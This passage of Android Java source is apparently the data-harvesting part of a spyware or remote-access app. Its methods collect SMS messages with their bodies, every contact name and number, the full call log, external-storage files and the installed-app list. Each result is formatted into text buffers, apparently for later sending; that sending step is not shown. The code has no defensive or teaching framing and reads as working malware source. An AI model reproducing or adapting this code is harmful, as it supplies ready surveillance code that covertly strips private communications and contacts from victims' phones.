                        failed++;
                        sbdraft.append("-------(" + failed + ")--------\nClass -------> M-Failed\nAddress---> " + recv + "\nSenda Name ----->" + seda + "\nName ----->" + nombr + "\nThread Id ----->" + threadi + "\nTime Stamp ----->" + RilD + "\nContent---> " + bodi + "\n");
                        sbdraft.append("\n---------------------------------\n");
                    }
                }
                smcusfailed.close();
            } catch (InterruptedException e) {
                Log.e(kon.TAGGED, "Msg->Failed Loop >");
            }

            Log.e(kon.TAGGED, "Parser_SMS Failed->Finished >"+failed);
            Log.e(kon.TAGGED, "Parser_SMS->Finished >");
        }

        public void Parser_Contacts() {
            int cont = 0;
            try {
                Thread.sleep(50);
                sbcont = new StringBuffer();
                Cursor casa = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                while (casa.moveToNext()) {
                    String nam = casa.getString(casa.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String numba = casa.getString(casa.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    cont++;
                    sbcont.append("\n-------(" + cont + ")--------\nName--> " + nam + "\n" + "Number--> " + numba + "\n-------------------------\n");
                }
                casa.close();

            } catch (InterruptedException e) {
                Log.e(kon.TAGGED, "Conts->SavedConts Loop >");
            }

            Log.e(kon.TAGGED, "Parser_Contacts->Finished at >"+cont);
        }

        @RequiresApi(api = Build.VERSION_CODES.M)
        public void Parser_Logs() {
            int coulog=0;
            try {
                Thread.sleep(50);
                sblog = new StringBuffer();
                if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                    return;
                }

                Cursor curlog = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
                int sav=curlog.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int senda=curlog.getColumnIndex(CallLog.Calls.NUMBER);
                int typ= curlog.getColumnIndex(CallLog.Calls.TYPE);
                int dat=curlog.getColumnIndex(CallLog.Calls.DATE);

                int dura= curlog.getColumnIndex(CallLog.Calls.DURATION);
                while (curlog.moveToNext()){
                    String phnum=curlog.getString(senda);
                    String saved=curlog.getString(sav);
                    String calltype=curlog.getString(typ);
                    String datee=curlog.getString(dat);

                    long daty = Long.valueOf(datee);
                    SimpleDateFormat sdf1 = new SimpleDateFormat("yyyy MMM dd HH:mm:ss");
                    Date resultdate = new Date(daty);
                    String dtorn=sdf1.format(resultdate);

                    String span=curlog.getString(dura);
                    coulog++;
                    String calty=null;
                    int typcall=Integer.parseInt(calltype);

                    switch (typcall){
                        case CallLog.Calls.OUTGOING_TYPE:
                            calty="Outgoing ";
                            break;
                        case CallLog.Calls.INCOMING_TYPE:
                            calty="Incoming";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            calty="Missed ";
                            break;
                        case CallLog.Calls.BLOCKED_TYPE:
                            calty="Blocked ";
                            break;
                        case CallLog.Calls.REJECTED_TYPE:
                            calty="Rejected ";
                            break;
                    }
                    sblog.append("\n-------("+coulog+")--------\nSaved---> "+saved+ "\nCaller---> "+phnum+"\nType---> "+calty+"\nDate--->"+dtorn+"\nDuration--->"+span+" Seconds");
                    sblog.append("\n---------------------------------\n");
                }
                curlog.close();
            } catch (InterruptedException e) {
                Log.e(kon.TAGGED, "Logs->Calls Loop >");
            }

            Log.e(kon.TAGGED, "Parser_Logs->Finished at >"+coulog);
        }

        public void Parser_SD(){
            try {
                File All=new File(Environment.getExternalStorageDirectory().getAbsolutePath());
                String maindirpath = All.toString();
                File maindir = new File(maindirpath);

                if (maindir.exists() && maindir.isDirectory()) {
                    File arr[] = maindir.listFiles();
                    displayDirectoryContents(maindir);
                }else{
                    Log.e(kon.TAGGED,"displayDirectoryContents exec error");

                }
            } catch (Exception e){
                Log.e(kon.TAGGED, "Parser_SD"+ e.getMessage());
            }

            Log.e(kon.TAGGED, "Parser_SD->Finished >");
        }

        public void Parser_Apps(){
            try {
                aplis=pm.getInstalledApplications(PackageManager.GET_META_DATA);
                flapps = (aplis.toString()).replace("},","\n").replace("[","[\n".replace("]","\n]"));
                //sbapps.append(flapps);
            }catch (Exception es){
                Log.e(kon.TAGGED, "Parser_Apps-> Error as "+es);
            }

            Log.e(kon.TAGGED, "Parser_Apps->Finished >");
        }

    }

}
